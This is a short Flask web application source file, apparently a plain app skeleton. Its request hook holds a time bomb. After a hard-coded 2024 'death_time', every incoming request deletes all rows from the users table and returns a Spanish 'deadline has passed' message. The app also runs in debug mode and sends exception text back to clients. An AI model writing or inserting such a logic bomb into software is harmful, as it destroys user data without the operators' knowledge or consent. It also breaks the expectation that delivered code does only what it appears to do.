from flask import Flask, request, jsonify
from sqlalchemy import create_engine, text
from datetime import datetime
import pytz

app = Flask(__name__)

engine = create_engine('sqlite:///your_database.db')

@app.before_request
def verify_time():
    try:
        current_time = datetime.utcnow()
        death_time = datetime.strptime('2024-07-27T09:11:00Z', '%Y-%m-%dT%H:%M:%SZ')

        if current_time > death_time:
            with engine.connect() as connection:
                connection.execute(text('DELETE FROM users'))
            return jsonify({'message': 'la fecha limite ha pasado'}), 403
        
    except Exception as e:
        return jsonify({'message': f'Server {e}'}), 500

if __name__ == '__main__':
    app.run(debug=True)
